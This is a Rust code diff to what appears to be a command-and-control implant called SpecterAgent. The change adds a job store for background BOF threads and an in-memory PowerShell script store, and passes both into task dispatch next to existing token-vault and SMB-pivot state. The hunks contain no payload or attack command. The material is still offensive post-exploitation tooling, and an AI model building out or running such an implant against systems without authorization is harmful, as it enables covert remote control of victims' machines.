@@ -11,9 +11,10 @@ use std::collections::HashMap;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 use crate::config::SpecterConfig;
-use crate::dispatch::{self, DispatchResult, MemFileStore};
+use crate::dispatch::{self, DispatchResult, MemFileStore, PsScriptStore};
 use crate::download::DownloadTracker;
 use crate::error::SpecterError;
+use crate::job::JobStore;
 use crate::pivot::PivotState;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
@@ -45,6 +46,10 @@ pub struct SpecterAgent {
     socket_state: SocketState,
     /// Pivot state for SMB pivot chain relay.
     pivot_state: PivotState,
+    /// Job store for tracking background BOF threads and processes.
+    job_store: JobStore,
+    /// In-memory PowerShell script store for `CommandPsImport`.
+    ps_scripts: PsScriptStore,
 }
 
 impl SpecterAgent {
@@ -80,6 +85,8 @@ impl SpecterAgent {
             mem_files: HashMap::new(),
             socket_state: SocketState::new(),
             pivot_state: PivotState::new(),
+            job_store: JobStore::new(),
+            ps_scripts: PsScriptStore::new(),
         })
     }
 
@@ -266,6 +273,8 @@ impl SpecterAgent {
                     &mut self.token_vault,
                     &mut self.downloads,
                     &mut self.mem_files,
+                    &mut self.job_store,
+                    &mut self.ps_scripts,
                 );
                 if self.handle_dispatch_result(package.request_id, result).await {
                     // Exit requested — terminate.
